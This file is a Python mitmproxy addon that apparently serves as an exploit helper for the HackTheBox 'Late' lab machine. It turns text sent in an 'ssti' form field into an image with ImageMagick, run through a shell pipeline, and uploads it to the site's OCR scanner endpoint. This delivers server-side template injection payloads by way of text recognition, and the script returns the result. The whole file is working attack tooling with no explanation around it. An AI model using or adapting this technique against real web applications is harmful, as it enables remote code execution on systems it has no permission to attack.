#!/usr/bin/env python3
from mitmproxy import http
import requests
import os
import base64
from urllib.parse import urlencode


url = "http://images.late.htb/scanner"
headers = {
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate",
    "Origin": "http://images.late.htb",
    "Connection": "close",
    "Referer": "http://images.late.htb/",
    "Upgrade-Insecure-Requests": "1",
}

outfile = "/tmp/a_test.png"


def get_img_text(text, additional_data):
    command = f"echo {base64.b64encode(text.encode()).decode()} | base64 -d " + \
        r"""| tr -d '\n' | sed 's|%|\\\\%|g' | sed 's|"|\\"|g' """ + \
        " | xargs -I {} " + \
        "convert -font Fira-Code-Bold -pointsize 70 -fill black label:{} " + outfile
    print(command)

    with os.popen(command) as p:
        pass
    print('here ')
    files = {
        'file': (
            outfile,
            open(outfile, 'rb'),
            'image/jpeg',
            # {'Expires': '0'}
        )
    }
    # print('sending files')
    r = requests.post(
        url + "?" + urlencode(additional_data),
        headers=headers,
        files=files,
        proxies={
            # 'http': 'http://127.0.0.1:8080'
        }
    )
    return r.text.split('>', 1)[-1].rsplit('<')[0]


def request(flow: http.HTTPFlow) -> None:
    if "images.late.htb/haxhaxhax" in flow.request.pretty_url:
        ssti_text = flow.request.urlencoded_form.pop('ssti')
        print(flow.request.urlencoded_form)
        r = get_img_text(
            ssti_text,
            flow.request.urlencoded_form
        )
        flow.response = http.Response.make(
            200,
            r,
        )
